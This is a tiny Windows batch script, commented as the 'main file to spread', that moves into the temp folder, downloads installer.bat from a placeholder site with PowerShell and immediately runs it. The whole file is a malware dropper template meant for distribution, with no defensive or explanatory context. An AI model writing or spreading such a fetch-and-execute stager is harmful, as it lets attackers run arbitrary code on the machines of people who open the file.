REM - This is your main file to spread.

cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat"
start installer.bat
